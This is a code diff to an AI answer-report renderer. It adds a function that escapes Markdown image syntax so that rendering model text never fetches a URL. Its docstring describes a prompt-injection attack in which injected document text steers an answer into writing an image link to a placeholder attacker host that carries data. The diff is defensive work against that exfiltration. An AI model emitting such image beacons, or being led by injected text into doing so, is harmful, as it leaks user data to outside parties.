@@ -2,6 +2,7 @@
 the prompt, the answer's citations, timings and the judge's verdicts."""
 
 import html
+import re
 from collections.abc import Mapping, Sequence
 from dataclasses import dataclass
 from statistics import fmean
@@ -148,6 +149,21 @@ def spans_html(spans: tuple[AnswerSpan, ...]) -> str:
     )
 
 
+# The "!" that starts Markdown image syntax: "![alt](url)", "![alt][ref]" or "![alt]".
+_IMAGE_START = re.compile(r"(?<!\\)!(?=\[)")
+
+
+def inert_markdown_images(text: str) -> str:
+    """Escape Markdown image syntax so rendering model text never fetches a URL.
+
+    An answer can be steered by injected text in a document into writing
+    ``![](https://attacker/pixel?data)``; rendered as Markdown, the browser would request
+    it. With the ``!`` escaped the text still shows, at most as a link nobody follows
+    automatically. Raw ``<img>`` HTML is handled separately (escaped or not allowed).
+    """
+    return _IMAGE_START.sub(r"\\!", text)
+
+
 def spans_markdown(spans: tuple[AnswerSpan, ...], levels: Sequence[tuple[int, float]] = ()) -> str:
     """The answer as Markdown (headings, lists, tables) with coloured citation chips.
 
@@ -165,7 +181,7 @@ def spans_markdown(spans: tuple[AnswerSpan, ...], levels: Sequence[tuple[int, fl
             out.append(chip if progress is None or progress >= 1
                        else f'<span style="{fade_style(progress)}">{chip}</span>')  # fmt: skip
         position += len(span.text)
-    return "".join(out)
+    return inert_markdown_images("".join(out))
 
 
 def timing_rows(trace: QueryTrace, judged: JudgeResult | None) -> tuple[tuple[str, float], ...]:
